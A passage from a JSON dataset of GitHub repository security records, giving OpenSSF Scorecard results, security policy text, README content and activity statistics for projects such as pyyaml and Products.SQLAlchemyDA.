        "project_age_days": 1867,
        "project_created_at": "2019-09-19",
        "latest_updated_at": "2024-10-22",
        "latest_pushed_at": "2024-04-03",
        "num_contributors": 64,
        "num_pull": 1065,
        "num_issues": 1125,
        "num_opening_issue": 52,
        "project_size(kB)": 30721,
        "num_stargazers": 697,
        "num_watchers": 697,
        "num_forks": 252,
        "num_subscribers": 59,
        "SecurityPolicy_created_at": "2021-07-19 11:31:44",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "url": "https://github.com/apache/.github/commit/c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "date": "2021-07-19 11:31:44"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "yaml/pyyaml",
        "project_url": "https://github.com/yaml/pyyaml",
        "SSF": {
            "date": "2024-10-29T23:10:33+07:00",
            "repo": {
                "name": "github.com/yaml/pyyaml",
                "commit": "69c141adcf805c5ebdc9ba519927642ee5c7f639"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.5,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'release/6.0'",
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 1,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "5 out of 10 merged PRs checked by a CI test -- score normalized to 5",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 7/30 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: sharpsaw contributor org/company found, PairUp contributor org/company found, Act-Conferences contributor org/company found, suse contributor org/company found, python-cffi contributor org/company found, Perl contributor org/company found, ansible-collections contributor org/company found, django-mptt contributor org/company found, Pioneer-Valley-Books contributor org/company found, FactoryBoy contributor org/company found, urllib3 contributor org/company found, MechanicalRabbit contributor org/company found, SublimeText contributor org/company found, django contributor org/company found, yaml contributor org/company found, perl6 contributor org/company found, perl11 contributor org/company found, testml-lang contributor org/company found, django-auth-ldap contributor org/company found, railsadminteam contributor org/company found, perl-doc-cats contributor org/company found, requests contributor org/company found, pyparsing contributor org/company found, python-ldap contributor org/company found, python-distro contributor org/company found, tufts ctsi contributor org/company found, acmeism contributor org/company found, cloudfreestyle contributor org/company found, o-fun contributor org/company found, SUSE contributor org/company found, ansible contributor org/company found, jazzband contributor org/company found, pioneer valley books contributor org/company found, Cloud-Apps contributor org/company found, BerlinPM contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 35 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "2 commit(s) and 12 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:79: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:362: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:368: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:375: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:413: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:464: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:521: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:527: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:534: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:569: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:581: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:599: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:188: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:194: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:201: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:247: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:273: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:279: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:298: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:432: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:115: update your workflow using https://app.stepsecurity.io/secureworkflow/yaml/pyyaml/ci.yaml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:230",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:553",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:60",
                        "Info:   0 out of  24 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   3 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 10 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: .github/SECURITY.md:1",
                        "Info: Found linked content: .github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: .github/SECURITY.md:1",
                        "Info: Found text in security policy: .github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/ci.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/yaml/pyyaml/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# PyYAML Security Policy\n\n## Reporting a Suspected Vulnerability\n\nThe PyYAML project encourages responsible disclosure of suspected security\nvulnerabilities. However, we do not offer bug bounties, paid disclosure, or\npaid fixes for discovered vulnerabilities. To report a suspected security\nvulnerability, please e-mail details to <security@pyyaml.org> without creating\npublic issues, pull requests, or discussion. Non-security correspondence to\nthis address will be ignored.\n",
        "project_all_labels": [
            "-★-",
            "-★★-",
            "-★★★-",
            "6.0",
            "6.1",
            "api:improvement",
            "component:c-extension",
            "component:distribution",
            "component:documentation",
            "component:libyaml",
            "empty/invalid/unrelated",
            "goal:long-term",
            "goal:short-term",
            "L",
            "M",
            "question",
            "S",
            "task:bug",
            "task:tech-debt"
        ],
        "README_content": "PyYAML\n======\n\nA full-featured YAML processing framework for Python\n\n## Installation\n\nTo install, type `python setup.py install`.\n\nBy default, the `setup.py` script checks whether LibYAML is installed and if\nso, builds and installs LibYAML bindings.\nTo skip the check and force installation of LibYAML bindings, use the option\n`--with-libyaml`: `python setup.py --with-libyaml install`.\nTo disable the check and skip building and installing LibYAML bindings, use\n`--without-libyaml`: `python setup.py --without-libyaml install`.\n\nWhen LibYAML bindings are installed, you may use fast LibYAML-based parser and\nemitter as follows:\n\n    >>> yaml.load(stream, Loader=yaml.CLoader)\n    >>> yaml.dump(data, Dumper=yaml.CDumper)\n\nIf you don't trust the input YAML stream, you should use:\n\n    >>> yaml.safe_load(stream)\n\n## Testing\n\nPyYAML includes a comprehensive test suite.\nTo run the tests, type `python setup.py test`.\n\n## Further Information\n\n* For more information, check the\n  [PyYAML homepage](https://github.com/yaml/pyyaml).\n\n* [PyYAML tutorial and reference](http://pyyaml.org/wiki/PyYAMLDocumentation).\n\n* Discuss PyYAML with the maintainers on\n  Matrix at https://matrix.to/#/#pyyaml:yaml.io or\n  IRC #pyyaml irc.libera.chat\n\n* Submit bug reports and feature requests to the\n  [PyYAML bug tracker](https://github.com/yaml/pyyaml/issues).\n\n## License\n\nThe PyYAML module was written by Kirill Simonov <xi@resolvent.net>.\nIt is currently maintained by the YAML and Python communities.\n\nPyYAML is released under the MIT license.\n\nSee the file LICENSE for more details.\n",
        "num_commits": 325,
        "project_age_days": 4744,
        "project_created_at": "2011-11-03",
        "latest_updated_at": "2024-10-28",
        "latest_pushed_at": "2024-08-19",
        "num_contributors": 37,
        "num_pull": 284,
        "num_issues": 830,
        "num_opening_issue": 287,
        "project_size(kB)": 838,
        "num_stargazers": 2557,
        "num_watchers": 2557,
        "num_forks": 518,
        "num_subscribers": 54,
        "SecurityPolicy_created_at": "2022-07-12 00:31:22",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "0abad85a17ba75c0fb431feea7a6a06125341a99",
                "url": "https://github.com/yaml/pyyaml/commit/0abad85a17ba75c0fb431feea7a6a06125341a99",
                "date": "2022-07-12 00:31:22"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "zopefoundation/products.sqlalchemyda",
        "project_url": "https://github.com/zopefoundation/products.sqlalchemyda",
        "SSF": {
            "date": "2024-10-29T21:13:07+07:00",
            "repo": {
                "name": "github.com/zopefoundation/products.sqlalchemyda",
                "commit": "55b7ee9dfe8f693df6e13f2ce7872cf1b9104710"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.9,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "3 out of 6 merged PRs checked by a CI test -- score normalized to 5",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 5/19 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: plone contributor org/company found, zopefoundation contributor org/company found, zopyx contributor org/company found, freelancer contributor org/company found, collective contributor org/company found, amazon contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/zopefoundation/Products.SQLAlchemyDA/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/zopefoundation/Products.SQLAlchemyDA/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/zopefoundation/Products.SQLAlchemyDA/tests.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:51",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:52",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:62",
                        "Info:   0 out of   3 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 6 commits out of 17 are checked with a SAST tool"
                    ],
                    "score": 3,
                    "reason": "SAST tool is not run on all commits -- score normalized to 3",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/zopefoundation/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/zopefoundation/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/zopefoundation/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/zopefoundation/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/zopefoundation/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\nThe Zope developer community uses the same security policy as the Plone developer community. The most up to date information about Plone security is on https://plone.org/security\n\n## Supported Versions\nFor supported versions, see the [Zope development roadmap](https://www.zope.dev/developer/roadmap.html).\n\n## Reporting a Vulnerability\nPlease do **NOT** create a public bug report if you think this may be a security issue.\nInstead, please contact the Plone and Zope Security Team via email: security@plone.org. See also https://plone.org/security/report\n\nOnly bug reports submitted directly to the security team email will be treated as responsible disclosure. Any offered for sale to third parties or submitted to public bug bounty programmes will be treated as irresponsible public disclosure. We will not confirm any submissions on third party platforms such as \"huntr\" or \"hackerone\" and do not give permission for those systems to accept reports on our behalf or to represent themselves as a conduit for vulnerability reports.\n",
        "project_all_labels": [
            "bug",
            "duplicate",
            "enhancement",
            "help wanted",
            "invalid",
            "question",
            "wontfix"
        ],
        "README_content": ".. image:: https://github.com/zopefoundation/Products.SQLAlchemyDA/actions/workflows/tests.yml/badge.svg\n        :target: https://github.com/zopefoundation/Products.SQLAlchemyDA/actions/workflows/tests.yml\n\n.. image:: https://coveralls.io/repos/github/zopefoundation/Products.SQLAlchemyDA/badge.svg\n        :target: https://coveralls.io/github/zopefoundation/Products.SQLAlchemyDA\n\n.. image:: https://img.shields.io/pypi/v/Products.SQLAlchemyDA.svg\n        :target: https://pypi.org/project/Products.SQLAlchemyDA/\n        :alt: Current version on PyPI\n\n.. image:: https://img.shields.io/pypi/pyversions/Products.SQLAlchemyDA.svg\n        :target: https://pypi.org/project/Products.SQLAlchemyDA/\n        :alt: Supported Python versions\n\n\nZope ZSQL-SQLAlchemy Integration Wrapper\n========================================\n\n\nAbout SQLAlchemyDA\n------------------\n\nSQLAlchemyDA is a generic database adapter for Zope ZSQL methods, which are\nan older/legacy SQL templating feature for executing relational database queries\nfrom with in a Zope to transaction context.\n\nSQLAlchemyDA provides an implementation in the form of a Zope \"product\" which\nwraps `z3c.sqlalchemy <https://pypi.org/project/z3c.sqlalchemy/>`_, so that\ndatabase connections are installable as objects in the Zope ZMI. Such\nconnection objects can be set up to connect to any kind of database backend\nsupported by SQLAlchemy using a database URI, such as Postgres, MySQL, Oracle,\nSQLite, MS-SQL, 